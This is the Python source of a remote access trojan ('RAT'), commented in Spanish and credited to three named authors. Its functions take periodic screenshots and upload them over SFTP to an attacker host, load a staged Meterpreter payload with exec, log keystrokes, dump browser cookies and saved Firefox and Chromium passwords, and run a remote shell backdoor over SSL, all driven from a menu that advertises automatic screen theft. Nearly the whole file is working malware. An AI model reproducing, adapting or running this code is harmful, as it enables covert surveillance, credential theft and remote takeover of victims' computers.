#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
Este archivo define los modulos a ser utilizados en el RAT.

Los modulos seran importados a partir de este archivo.

Autores.
-Fernando Castaneda
-Diego Serrano
-Manuel Ocomatl
"""

amo=''
puerto=6116
meter=4444

def pantallazo():
	import datetime
	import os, errno
	import subirArchivo
	import time
	nomArchivo = datetime.datetime.now().strftime("%Y-%m-%d--%H:%M:%S")+".png"
	os.system("import -window root /tmp/"+nomArchivo)

	#Copiando el archivo al equipo atacante
	rutaAtacante = '/var/www/test_readwrite/'+nomArchivo
	rutaVictima = '/tmp/'+nomArchivo
	username="emodulo"
	password="hola123,"
	subirArchivo.subir(rutaAtacante,rutaVictima,amo,username,password)

	#Eliminando el archivo en el equipo de la victima
	try:
		os.remove(rutaVictima)
	except OSError:
	    pass

def pantallazoAutomatico():
	import time
	while True:
	    pantallazo()
	    time.sleep(30)

def meterpreter(srv,pto):
	import socket,struct
	s=socket.socket(2,1)
	s.connect((srv,pto))
	l=struct.unpack('>I',s.recv(4))[0]
	d=s.recv(4096)
	while len(d)!=l:
	    d+=s.recv(4096)
	exec(d,{'s':s})

def keylogger():
	import pyxhook
	#Es necesario el archivo pyxhook.py
	log='/tmp/cap'
	def OnKeyPress(event):
		f=open(log,'a')
		f.write(event.Key)
		f.write('\n')
		if event.Ascii==96:
			f.close()
			hook.cancel()
	hook=pyxhook.HookManager()
	hook.KeyDown=OnKeyPress
	hook.HookKeyboard()
	hook.start()

def cookies():
	#Es necesario tener instalado sqlite3 en el sistema
	import sqlite3
	import sys
	import glob
	f=open('cookies','a')
	def firefox():
		#Probado con ICEWEASEL
		for ruta in glob.glob(r'/home/*/.mozilla/firefox/*/cookies.sqlite'):
			conn=sqlite3.connect(ruta)
			cur=conn.cursor()
			cur.execute("select host, path, baseDomain, lastAccessed, expiry, name, value from moz_cookies")
			for i in cur:
				f.write("Host = "+ str(i[0]))
				f.write("Ruta = "+ str(i[1]))
				f.write("Dominio Base = "+ str(i[2]))
				f.write("Ultimo Acceso = "+ str(i[3]))
				f.write("Expira = "+ str(i[4]))
				f.write("Nombre = "+ str(i[5]))
				f.write("Value =  "+ str(i[6])+ "\n")

			conn.close()

	def chrome():
		#Funciona para chrome y chromium
		for ruta in glob.glob(r'/home/*/.config/*/Default/Cookies'):
			conn=sqlite3.connect(ruta)
			cur=conn.cursor()
			cur.execute("select host_key, name, value, path, httponly, last_access_utc from cookies")
			for i in cur:
			        f.write("Host = "+ str(i[0]))
			        f.write("Nombre = "+ str(i[1]))
			        f.write("Value = "+ str(i[2]))
			        f.write("Ruta = "+ str(i[3]))
			        f.write("httponly = "+ str(i[4]))
			        f.write("Ultimo acceso = "+ str(i[5])+ "\n")

			conn.close()
	chrome()
	firefox()
	f.close()

def passwd():
	import ffpassdecrypt
	import glob
	import os
	def firefox():
		f=file('ff-pass','a')
		s=ffpassdecrypt.main()
		#f.write(str(s))
		#f.write('\n')
	def chrome():
		for ruta in glob.glob(r'/home/*/.config/chromium/Default/Login Data'):
			os.system(str("python chrome-password-export.py -i "+ruta+" -p -o chrome-pass"))
	chrome()
	firefox()

def backdoor(s):
	import os,socket,sys,ssl
	#n=socket.socket()
	#n.bind((cliente,pto))
	#n.listen(6)
	#ss=ssl.wrap_socket(n,server_side=True,keyfile="llave.pem",certfile="cert.pem",ssl_version=ssl.PROTOCOL_SSLv23)
	#s,p = ss.accept()
	while 1:
	    data = s.recv(1024)
	    if "q" == data.lower():
	        s.close()
	        break;
	    else:
	        if data.startswith('cd'):
	            os.chdir(data[3:].replace('\n',''))
	            s.send("Directorio: "+str(os.getcwd()))
	            result='\n'
	            continue;
	            #s.send(str(os.getcwd()))
	        else:
	            result=os.popen(data).read()
	    if (data.lower() != "q"):
	            s.send(str(result))
	    else:
	        s.send(str(result))
	        #s.close()
	        #break;
	        return;
	#exit()

def subir(rutaAtacante,rutaVictima, host, username, password ):
	#La rutaVictima es la del equipo infectado, se igresa el nombre del archivo y su ruta ejemplo "/home/algo/secret.txt"
	#La rutaAtacante es la ruta del equipo qque se usará para 
	#La ruta 
	import paramiko
	port = 22	
	transport = paramiko.Transport((host, port))
	transport.connect(username = username, password = password)
	sftp = paramiko.SFTPClient.from_transport(transport)
	sftp.put(rutaVictima, rutaAtacante)

def remoto(cliente,pto):
	import os,socket,sys,ssl
	import threading
	import logging
	import time
	n=socket.socket()
	n.bind((cliente,pto))
	n.listen(6)
	ss=ssl.wrap_socket(n,server_side=True,keyfile="llave.pem",certfile="cert.pem",ssl_version=ssl.PROTOCOL_SSLv23)
	s,p = ss.accept()
	data = 'W'
	while 1:
		#print data
		if not data or data == 'W' or len(data)==0 or data == None:
			data = s.recv(512)
		if data == '1':
			try:
				backdoor(s)
				data = 'W'
			except:
				print ":'("
				data = 'W'
		elif data == '2':
			try:
				print "meterpreter :D"
				try:
					meterpreter(amo,meter)
					s.send('Meterpreter activo')
				except:
					s.send('Posiblemente el puerto ya esta ocupado o meterpreter no esta escuchando.')
				print "saliendo..."
				data = 'W'
			except:
				print "murio :'("
				data = 'W'
		elif data == '3':
			try:
				t=threading.Thread(target=pantallazoAutomatico,name='TeRoboTuPantalla')
				t.setDaemon(True)
				t.start()
				s.send("Habilitado el robo automatico :), disfrute en su equipo")
				data = 'W'
			except:
				print "No se pudo habilitar el robo automatico :("
				data = 'W'
		else:
			s,p = ss.accept()
			continue;
	exit()

#screenshot()
#meterpreter('192.168.47.134',4444)
#keylogger()
#cookies()
#passwd()


if __name__ == '__main__':
	cookies()
	#remoto(amo,puerto)